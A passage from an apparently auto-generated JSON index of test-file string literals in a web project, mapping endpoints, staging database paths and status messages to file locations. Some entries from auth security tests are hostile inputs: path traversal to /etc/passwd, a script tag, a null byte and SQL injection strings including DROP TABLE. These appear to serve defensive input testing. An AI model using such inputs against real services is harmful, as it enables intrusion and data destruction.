        "scripts/business_value_test_index.py:131",
        "scripts/check_conftest_violations.py:22",
        "scripts/compliance/project_test_validator.py:40",
        "scripts/compliance/real_test_requirements_enforcer.py:133",
        "scripts/compliance/test_size_validator.py:156",
        "scripts/fix_all_test_issues.py:16",
        "scripts/fix_all_test_issues.py:19",
        "scripts/generate_test_audit.py:22"
      ]
    },
    ".vs": {
      "value": ".vs",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:135"
      ]
    },
    ".vscode": {
      "value": ".vscode",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:135"
      ]
    },
    ".yaml": {
      "value": ".yaml",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:107"
      ]
    },
    "/": {
      "value": "/",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:209",
        "auth_service/test_actual_staging_credentials.py:171",
        "auth_service/test_staging_db_connection.py:316",
        "auth_service/test_url_construction.py:237",
        "auth_service/tests/database/test_config.py:110",
        "auth_service/tests/test_auth_startup_integration.py:143",
        "auth_service/tests/test_auth_token_validation.py:340",
        "auth_service/tests/test_graceful_shutdown_failures.py:461",
        "auth_service/tests/test_password_hashing_basics.py:254",
        "scripts/analyze_test_overlap.py:115"
      ]
    },
    "/ directory...": {
      "value": "/ directory...",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:245"
      ]
    },
    "/**/*.test.[jt]s?(x)": {
      "value": "/**/*.test.[jt]s?(x)",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:178",
        "scripts/test_frontend.py:180"
      ]
    },
    "/100": {
      "value": "/100",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:64",
        "scripts/simple_test_fix_loop.py:93",
        "scripts/simple_test_fix_loop.py:94"
      ]
    },
    "/100 ---": {
      "value": "/100 ---",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:12"
      ]
    },
    "/100 ===": {
      "value": "/100 ===",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:121"
      ]
    },
    "/__init__.py": {
      "value": "/__init__.py",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:235",
        "scripts/fix_test_batch.py:97"
      ]
    },
    "/_next/static": {
      "value": "/_next/static",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:134"
      ]
    },
    "/`": {
      "value": "/`",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:199"
      ]
    },
    "/`:": {
      "value": "/`:",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:176"
      ]
    },
    "/api/admin/shutdown": {
      "value": "/api/admin/shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:531"
      ]
    },
    "/api/agents": {
      "value": "/api/agents",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:108"
      ]
    },
    "/auth/config": {
      "value": "/auth/config",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:143"
      ]
    },
    "/auth/dev_login": {
      "value": "/auth/dev_login",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:243"
      ]
    },
    "/auth/login?provider=google": {
      "value": "/auth/login?provider=google",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:395",
        "scripts/test_oauth_local.py:186"
      ]
    },
    "/auth/me": {
      "value": "/auth/me",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:302"
      ]
    },
    "/auth/validate": {
      "value": "/auth/validate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:96",
        "auth_service/tests/auth-service-down-critical-scenarios.py:140",
        "auth_service/tests/auth-service-down-critical-scenarios.py:265",
        "auth_service/tests/auth-service-down-critical-scenarios.py:323",
        "auth_service/tests/auth-service-down-critical-scenarios.py:433",
        "auth_service/tests/auth-service-down-critical-scenarios.py:465"
      ]
    },
    "/api/health": {
      "value": "/api/health",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:179",
        "auth_service/tests/auth-service-down-critical-scenarios.py:363",
        "scripts/test_staging_env.py:121"
      ]
    },
    "/api/threads": {
      "value": "/api/threads",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1425",
        "scripts/test_cold_start_e2e.py:324",
        "scripts/test_staging_deployment.py:104",
        "scripts/test_staging_env.py:69",
        "scripts/test_staging_env.py:107"
      ]
    },
    "/api/threads/": {
      "value": "/api/threads/",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:346"
      ]
    },
    "/api/user/me": {
      "value": "/api/user/me",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:70"
      ]
    },
    "/api/user/profile": {
      "value": "/api/user/profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1372"
      ]
    },
    "/api/workspaces": {
      "value": "/api/workspaces",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:106"
      ]
    },
    "/app/tests/integration/": {
      "value": "/app/tests/integration/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:361"
      ]
    },
    "/auth/": {
      "value": "/auth/",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:168"
      ]
    },
    "/auth/callback": {
      "value": "/auth/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:407",
        "scripts/test_staging_deployment.py:128"
      ]
    },
    "/auth/callback/google": {
      "value": "/auth/callback/google",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:148",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:187",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:263",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:297",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:303",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:335",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:370",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:397",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:447",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:497"
      ]
    },
    "/auth/callback?": {
      "value": "/auth/callback?",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:134"
      ]
    },
    "/auth/callback?code=": {
      "value": "/auth/callback?code=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:213",
        "auth_service/tests/integration/test_auth_oauth_errors.py:290",
        "auth_service/tests/integration/test_auth_oauth_errors.py:362",
        "auth_service/tests/integration/test_auth_oauth_errors.py:408",
        "auth_service/tests/integration/test_auth_oauth_errors.py:412",
        "auth_service/tests/integration/test_auth_oauth_errors.py:479",
        "auth_service/tests/integration/test_auth_oauth_errors.py:514",
        "auth_service/tests/integration/test_auth_oauth_errors.py:517",
        "auth_service/tests/integration/test_auth_oauth_errors.py:518",
        "auth_service/tests/integration/test_auth_oauth_errors.py:521"
      ]
    },
    "/auth/callback?code=../../../etc/passwd": {
      "value": "/auth/callback?code=../../../etc/passwd",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:416"
      ]
    },
    "/auth/callback?code=<script>&state=test": {
      "value": "/auth/callback?code=<script>&state=test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:415"
      ]
    },
    "/auth/callback?code=test%00&state=test": {
      "value": "/auth/callback?code=test%00&state=test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:414"
      ]
    },
    "/auth/callback?code=test&state=": {
      "value": "/auth/callback?code=test&state=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:413"
      ]
    },
    "/auth/callback?code=test' OR '1'='1&state=test": {
      "value": "/auth/callback?code=test' OR '1'='1&state=test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:424"
      ]
    },
    "/auth/callback?code=test; DROP TABLE users;&state=test": {
      "value": "/auth/callback?code=test; DROP TABLE users;&state=test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:425"
      ]
    },
    "/auth/callback?code=test_code": {
      "value": "/auth/callback?code=test_code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:96",
        "auth_service/tests/integration/test_oauth_flows_sync.py:54"
      ]
    },
    "/auth/callback?code=test_code&state=": {
      "value": "/auth/callback?code=test_code&state=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:98",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:118"
      ]
    },
    "/auth/callback?code=test_code&state=test_state": {
      "value": "/auth/callback?code=test_code&state=test_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:184"
      ]
    },
    "/auth/callback?code=valid_code&state=": {
      "value": "/auth/callback?code=valid_code&state=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:315"
      ]
    },
    "/auth/callback?error=access_denied&state=test_state": {
      "value": "/auth/callback?error=access_denied&state=test_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:74"
      ]
    },
    "/auth/callback?state=test": {
      "value": "/auth/callback?state=test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:409"
      ]
    },
    "/auth/callback?state=test_state": {
      "value": "/auth/callback?state=test_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:50"
      ]
    },
    "/auth/config": {
      "value": "/auth/config",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_auth.py:31",
        "auth_service/tests/integration/test_oauth_flows_auth.py:41",
        "auth_service/tests/integration/test_oauth_flows_core.py:42",
        "auth_service/tests/integration/test_oauth_flows_core.py:52",
        "auth_service/tests/integration/test_oauth_flows_sync.py:27",
        "auth_service/tests/integration/test_oauth_flows_sync.py:132",
        "auth_service/tests/utils/test_client.py:185"
      ]
    },
    "/auth/dev-login": {
      "value": "/auth/dev-login",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:230"
      ]
    },
    "/auth/google/callback": {
      "value": "/auth/google/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:359"
      ]
    },
    "/auth/health": {
      "value": "/auth/health",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:61",
        "auth_service/tests/test_security.py:332",
        "auth_service/tests/test_security.py:384",
        "auth_service/tests/test_security.py:707",
        "scripts/test_auth_integration.py:44",
        "scripts/test_staging_deployment.py:85"
      ]
    },
    "/auth/login": {
      "value": "/auth/login",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:151",
        "auth_service/tests/test_security.py:163",
        "auth_service/tests/test_security.py:261",
        "auth_service/tests/test_security.py:296",
        "auth_service/tests/test_security.py:369",
        "auth_service/tests/test_security.py:413",
        "auth_service/tests/test_security.py:449",
        "auth_service/tests/test_security.py:465",
        "auth_service/tests/test_security.py:489",
        "auth_service/tests/test_security.py:517"
      ]
    },
    "/auth/login/google": {
      "value": "/auth/login/google",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1407"
      ]
    },
    "/auth/login?provider=": {
      "value": "/auth/login?provider=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:420",
        "auth_service/tests/integration/test_auth_oauth_errors.py:421"
      ]
    },
    "/auth/login?provider=google": {
      "value": "/auth/login?provider=google",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:96",
        "auth_service/tests/integration/test_oauth_flows_sync.py:37",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:53"
      ]
    },
    "/auth/login?provider=google&scope=": {
      "value": "/auth/login?provider=google&scope=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:318"
      ]
    },
    "/auth/login?provider=invalid_provider": {
      "value": "/auth/login?provider=invalid_provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:419"
      ]
    },
    "/auth/logout": {
      "value": "/auth/logout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:83",
        "auth_service/tests/utils/test_client.py:75",
        "auth_service/tests/utils/test_client.py:194"
      ]
    },
    "/auth/password": {
      "value": "/auth/password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:145"
      ]
    },
    "/auth/refresh": {
      "value": "/auth/refresh",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1379",
        "auth_service/tests/utils/test_client.py:92"
      ]
    },
    "/auth/service-token": {
      "value": "/auth/service-token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:231"
      ]
    },
    "/auth/sessions": {
      "value": "/auth/sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:213"
      ]
    },
    "/auth/sessions/": {
      "value": "/auth/sessions/",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:201"
      ]
    },
    "/auth/token": {
      "value": "/auth/token",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:129"
      ]
    },
    "/auth/user": {
      "value": "/auth/user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:123"
      ]
    },
    "/auth/validate": {
      "value": "/auth/validate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:193",
        "auth_service/tests/test_security.py:597",
        "auth_service/tests/test_security.py:632",
        "auth_service/tests/test_security.py:673",
        "auth_service/tests/utils/test_client.py:111",
        "scripts/test_auth_integration.py:89"
      ]
    },
    "/auth/verify": {
      "value": "/auth/verify",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1126",
        "auth_service/tests/integration/test_oauth_flows_sync.py:91"
      ]
    },
    "/callback": {
      "value": "/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:168"
      ]
    },
    "/cloudsql/": {
      "value": "/cloudsql/",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:231",
        "auth_service/test_staging_db_connection.py:241",
        "auth_service/test_url_construction.py:141",
        "auth_service/test_url_construction.py:162",
        "auth_service/tests/test_auth_database_manager_missing_method.py:83",
        "auth_service/tests/test_cloud_sql_url.py:41",
        "auth_service/tests/test_database_manager.py:43",
        "auth_service/tests/test_database_manager.py:85",
        "auth_service/tests/test_staging_auth_ssl_failures.py:58",
        "auth_service/tests/test_staging_auth_ssl_failures.py:116"
      ]
    },
    "/cloudsql/invalid-format": {
      "value": "/cloudsql/invalid-format",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:192"
      ]
    },
    "/cloudsql/netra-staging:us-central1:netra-staging-db": {
      "value": "/cloudsql/netra-staging:us-central1:netra-staging-db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:146",
        "auth_service/tests/test_critical_staging_database_failures.py:247"
      ]
    },
    "/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:34",
        "auth_service/test_actual_staging_credentials.py:71",
        "auth_service/test_staging_db_connection.py:39",
        "auth_service/test_staging_db_connection.py:55",
        "auth_service/test_url_construction.py:35",
        "scripts/test_database_url_builder_comprehensive.py:22",
        "scripts/test_ssl_certificates_staging.py:110",
        "scripts/test_staging_migrations.py:185"
      ]
    },
    "/cloudsql/prod-project:us-central1:prod-instance": {
      "value": "/cloudsql/prod-project:us-central1:prod-instance",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:262"
      ]
    },
    "/cloudsql/project:region:instance": {
      "value": "/cloudsql/project:region:instance",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:203",
        "scripts/test_database_url_builder_comprehensive.py:225"
      ]
    },
    "/docs": {
      "value": "/docs",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:43",
        "scripts/test_staging_env.py:57"
      ]
    },
    "/e2e/": {
      "value": "/e2e/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:284",
        "scripts/business_value_test_index.py:356"
      ]
    },
    "/etc/passwd": {
      "value": "/etc/passwd",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:440"
      ]
    },
    "/health": {
      "value": "/health",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1452",
        "auth_service/tests/test_auth_startup_integration.py:94",
        "auth_service/tests/test_auth_startup_integration.py:113",
        "auth_service/tests/test_critical_staging_issues.py:201",
        "scripts/test_auth_integration.py:30",
        "scripts/test_auth_integration.py:65",
        "scripts/test_cold_start_e2e.py:194",
        "scripts/test_cold_start_e2e.py:196",
        "scripts/test_frontend.py:256",
        "scripts/test_oauth_local.py:105"
      ]
    },
    "/health/": {
      "value": "/health/",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:84"
      ]
    },
    "/health/live": {
      "value": "/health/live",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:181"
      ]
    },
    "/health/ready": {
      "value": "/health/ready",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:154",
        "scripts/test_staging_startup.py:180"
      ]
    },
    "/integration/": {
      "value": "/integration/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:360"
      ]
    },
    "/messages": {
      "value": "/messages",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:346"
      ]
    },
    "/netra_staging": {
      "value": "/netra_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:108",
        "auth_service/test_url_construction.py:109"
      ]
    },
    "/postgres": {
      "value": "/postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:72",
        "auth_service/tests/database/test_config.py:122",
        "auth_service/tests/database/test_config.py:147"
      ]
    },
    "/secrets/": {
      "value": "/secrets/",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:18",
        "scripts/test_ssl_certificates_staging.py:19",
        "scripts/test_staging_db_direct.py:21",
        "scripts/test_staging_migrations.py:18"
      ]
    },
    "/secure": {
      "value": "/secure",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:450"
      ]
    },
    "/tests/": {
      "value": "/tests/",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:163"
      ]
    },
    "/tests/e2e/": {
      "value": "/tests/e2e/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:356"
      ]
    },
    "/tests/integration/": {
      "value": "/tests/integration/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:360"
      ]
    },
    "/tests/unified/e2e/": {
      "value": "/tests/unified/e2e/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:356"
      ]
    },
    "/tests/unit/": {
      "value": "/tests/unit/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:365"
      ]
    },
    "/unit/": {
      "value": "/unit/",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:365"
      ]
    },
    "/v1": {
      "value": "/v1",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:450"
      ]
    },
    "/versions/latest": {
      "value": "/versions/latest",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:18",
        "scripts/test_ssl_certificates_staging.py:19",
        "scripts/test_staging_db_direct.py:21",
        "scripts/test_staging_migrations.py:18"
      ]
    },
    "/ws": {
      "value": "/ws",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:451",
        "scripts/test_cold_start_e2e.py:451",
        "scripts/test_cold_start_e2e.py:457",
        "scripts/test_staging_env.py:25"
      ]
    },
    "/ws/config": {
      "value": "/ws/config",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:88"
      ]
    },
    "/ws/health": {
      "value": "/ws/health",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:118"
      ]
    },
    "0": {
      "value": "0",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:351"
      ]
    },
    "0.0.0.0": {
      "value": "0.0.0.0",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:71",
        "auth_service/tests/test_auth_startup_integration.py:61",
        "auth_service/tests/test_auth_startup_integration.py:256",
        "auth_service/tests/test_auth_startup_integration.py:266",
        "scripts/test_websocket_dev_mode.py:56"
      ]
    },
    "00-": {
      "value": "00-",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:687"
      ]
    },
    "1": {
      "value": "1",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:78",
        "scripts/test_backend.py:106",
        "scripts/unified_test_runner.py:207"
      ]
    },
    "1!": {
      "value": "1!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:123"
      ]
    },
    "1' OR 1=1 UNION SELECT @@version --": {
      "value": "1' OR 1=1 UNION SELECT @@version --",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:88"
      ]
    },
    "1. **Fix Critical Violations First** - Address mock component implementations": {
      "value": "1. **Fix Critical Violations First** - Address mock component implementations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:564"
      ]
    },
    "1. **Resource Utilization Analysis**\n           - GPU utilization averaging 67% with peaks at 95%\n           - Memory usage shows gradual increase pattern\n           - CPU bottleneck detected during data preprocessing\n        \n        2. **Cost Optimization Opportunities**\n           - Switch to spot instances for batch workloads (30% savings)\n           - Implement request batching for 40% throughput improvement\n           - Consider model quantization for inference optimization\n        \n        3. **Performance Recommendations**\n           - Enable tensor parallelism for large models\n           - Implement gradient checkpointing to reduce memory\n           - Use mixed precision training for 2x speedup\n        \n        4. **Scaling Considerations**\n           - Current setup can handle 10x load with modifications\n           - Recommend horizontal scaling for API endpoints\n           - Database connection pooling needs adjustment": {
      "value": "1. **Resource Utilization Analysis**\n           - GPU utilization averaging 67% with peaks at 95%\n           - Memory usage shows gradual increase pattern\n           - CPU bottleneck detected during data preprocessing\n        \n        2. **Cost Optimization Opportunities**\n           - Switch to spot instances for batch workloads (30% savings)\n           - Implement request batching for 40% throughput improvement\n           - Consider model quantization for inference optimization\n        \n        3. **Performance Recommendations**\n           - Enable tensor parallelism for large models\n           - Implement gradient checkpointing to reduce memory\n           - Use mixed precision training for 2x speedup\n        \n        4. **Scaling Considerations**\n           - Current setup can handle 10x load with modifications\n           - Recommend horizontal scaling for API endpoints\n           - Database connection pooling needs adjustment",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:179"
      ]
    },
    "1. Back up all files first": {
      "value": "1. Back up all files first",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:952"
      ]
    },
    "1. Base URL:": {
      "value": "1. Base URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:122"
      ]
    },
    "1. Check for missing dependencies: pip install -r requirements.txt": {
      "value": "1. Check for missing dependencies: pip install -r requirements.txt",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:109"
      ]
    },
    "1. Checking Alembic configuration files...": {
      "value": "1. Checking Alembic configuration files...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:101"
      ]
    },
    "1. Database name mismatch ('postgres' vs expected 'netra_staging')": {
      "value": "1. Database name mismatch ('postgres' vs expected 'netra_staging')",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:175"
      ]
    },
    "1. Environment safety checks...": {
      "value": "1. Environment safety checks...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:180"
      ]
    },
    "1. Extract setup logic into fixture or helper method": {
      "value": "1. Extract setup logic into fixture or helper method",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:211"
      ]
    },
    "1. Fetching individual PostgreSQL secrets...": {
      "value": "1. Fetching individual PostgreSQL secrets...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:37"
      ]
    },
    "1. Fetching staging configuration...": {
      "value": "1. Fetching staging configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:222"
      ]
    },
    "1. Fetching staging database configuration...": {
      "value": "1. Fetching staging database configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:35",
        "scripts/test_staging_migrations.py:34"
      ]
    },
    "1. Fetching staging database secrets...": {
      "value": "1. Fetching staging database secrets...",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:205"
      ]
    },
    "1. IMMEDIATE FIX: Use 'postgres' database as configured in Secret Manager": {
      "value": "1. IMMEDIATE FIX: Use 'postgres' database as configured in Secret Manager",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:103"
      ]
    },
    "1. Missing mocks for external services (ClickHouse, Redis, WebSocket)": {
      "value": "1. Missing mocks for external services (ClickHouse, Redis, WebSocket)",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:76"
      ]
    },
    "1. Mock component function fix": {
      "value": "1. Mock component function fix",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:382"
      ]
    },
    "1. Move fixtures to appropriate service-level conftest.py": {
      "value": "1. Move fixtures to appropriate service-level conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:90"
      ]
    },
    "1. Preparing migration environment...": {
      "value": "1. Preparing migration environment...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:222"
      ]
    },
    "1. Production environment URLs...": {
      "value": "1. Production environment URLs...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:271"
      ]
    },
    "1. Quick real e2e test (with mock services):": {
      "value": "1. Quick real e2e test (with mock services):",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:151"
      ]
    },
    "1. Review SPEC/no_test_stubs.xml for guidelines": {
      "value": "1. Review SPEC/no_test_stubs.xml for guidelines",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:85"
      ]
    },
    "1. Review the changes with: git diff": {
      "value": "1. Review the changes with: git diff",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:242"
      ]
    },
    "1. Review the report above": {
      "value": "1. Review the report above",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1018"
      ]
    },
    "1. Run tests to verify functionality: python unified_test_runner.py": {
      "value": "1. Run tests to verify functionality: python unified_test_runner.py",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:293"
      ]
    },
    "1. Set GOOGLE_CLIENT_ID in .env file": {
      "value": "1. Set GOOGLE_CLIENT_ID in .env file",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:399"
      ]
    },
    "1. Split by test categories (unit/integration/e2e)": {
      "value": "1. Split by test categories (unit/integration/e2e)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:195"
      ]
    },
    "1. Split by test categories:": {
      "value": "1. Split by test categories:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:369"
      ]
    },
    "1. Test Size Validator - scans for violations": {
      "value": "1. Test Size Validator - scans for violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:205"
      ]
    },
    "1. Test Size Validator:": {
      "value": "1. Test Size Validator:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:178"
      ]
    },
    "1. Test files MUST be ≤300 lines (SPEC/testing.xml)": {
      "value": "1. Test files MUST be ≤300 lines (SPEC/testing.xml)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:265"
      ]
    },
    "1. Testing URL conversion...": {
      "value": "1. Testing URL conversion...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:75"
      ]
    },
    "1. Testing URL validation...": {
      "value": "1. Testing URL validation...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:168"
      ]
    },
    "1. Testing auth service imports...": {
      "value": "1. Testing auth service imports...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:34"
      ]
    },
    "1. Testing engine creation...": {
      "value": "1. Testing engine creation...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:125"
      ]
    },
    "1. Testing import resolution...": {
      "value": "1. Testing import resolution...",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:278"
      ]
    },
    "1. Testing session management patterns...": {
      "value": "1. Testing session management patterns...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:303"
      ]
